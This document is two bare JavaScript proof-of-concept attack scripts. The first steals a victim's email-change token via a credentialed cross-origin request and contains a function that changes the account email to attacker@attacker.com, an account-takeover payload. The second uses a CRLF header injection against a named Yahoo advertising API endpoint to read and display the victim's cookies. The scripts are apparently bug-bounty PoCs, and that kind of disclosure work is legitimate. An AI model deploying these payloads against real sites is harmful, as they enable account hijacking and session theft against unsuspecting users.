function stealEmailToken() {
    
	var fetchHash = new XMLHttpRequest();

    var url = "https://--domain--/--path--/personal/update_email.html";
    var datax;
    var all_elements;
    var vc_email_token = 'initial';

    fetchHash.onreadystatechange = function() {
		
        if (fetchHash.readyState == 4 && fetchHash.status == 200) {

            datax = fetchHash.responseText;
            var loot = document.createElement('html');
            loot.innerHTML = datax;
            all_elements = loot.getElementsByTagName('input');
            vc_email_token = all_elements[2].value;
            alert('Stole your Email change Token: ' + vc_email_token + ' ...Tabahi');
            //hack(vc_email_token);

        }

    }

    fetchHash.open("GET", url, true);
    fetchHash.withCredentials = true;
    fetchHash.send();

}

stealEmailToken();

function hack(emailToken) {

    var HackAccount = new XMLHttpRequest();

    url = "https://--domain--/--path--/personal/update_email.html";

    HackAccount.open("POST", url, true);

    HackAccount.withCredentials = true;

    var data = 'AccountEmailForm%5BsEmail%5D%5Bfirst%5D=attacker%40attacker.com&AccountEmailForm%5BsEmail%5D%5Bsecond%5D=attacker%40attacker.com&AccountEmailForm%5B_token%5D=' + emailToken;

    HackAccount.setRequestHeader('X-Requested-With', 'XMLHttpRequest');

    HackAccount.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
    
	HackAccount.send(data);

}

---------------------------------------------------------

var getcookie = new XMLHttpRequest();
var url = "https://api.advertising.yahoo.com/services/network/whoami?Access-Control-Expose-Header%0d%0as=Cookie";

getcookie.onreadystatechange = function() {
    if (getcookie.readyState == getcookie.DONE) {
        document.write(getcookie.getResponseHeader("Cookie") + "<h1>I have stolen all your cookies");
    }
}

getcookie.open("GET", url, true);
getcookie.withCredentials = true;
getcookie.send();